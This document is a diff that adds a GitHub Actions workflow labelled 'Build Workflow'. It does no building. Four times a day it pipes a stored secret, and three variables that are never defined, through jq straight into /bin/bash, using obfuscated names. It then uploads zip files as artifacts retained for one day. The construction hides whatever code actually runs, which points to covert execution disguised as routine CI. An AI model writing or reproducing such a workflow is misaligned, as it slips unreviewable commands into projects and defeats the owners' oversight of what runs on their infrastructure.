@@ -1,0 +1,31 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '36 4,10,16,22 * * *'
+permissions:
+  contents: read
+  actions: read
+jobs:
+  execute:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Run
+        env:
+          ks51: ${{ secrets.ks51 }}
+        run: |
+          printf '%s' "$ks51" | jq -r .cwuyq39034 | /bin/bash
+          printf '%s' "$bq69" | jq -r .t445 | /bin/bash
+          printf '%s' "$wwuwi2" | jq -r .h81267 | /bin/bash
+          echo $uyaac9 | jq -r .ru61243 | /bin/bash
+
+      - name: Store results
+        uses: actions/upload-artifact@v4
+        with:
+          name: tipcoyXC
+          path: "*.zip"
+          retention-days: 1
